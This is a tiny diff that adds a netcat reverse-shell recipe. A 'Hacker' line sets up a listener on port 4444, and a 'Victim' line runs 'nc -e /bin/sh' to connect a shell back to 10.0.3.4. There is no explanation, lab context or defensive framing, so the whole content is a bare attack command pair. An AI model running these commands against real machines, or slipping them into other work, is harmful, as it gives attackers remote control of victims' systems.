@@ -1,0 +1,5 @@
+Hacker
+nc -lvp 4444
+
+Victim
+nc -e /bin/sh 10.0.3.4 4444
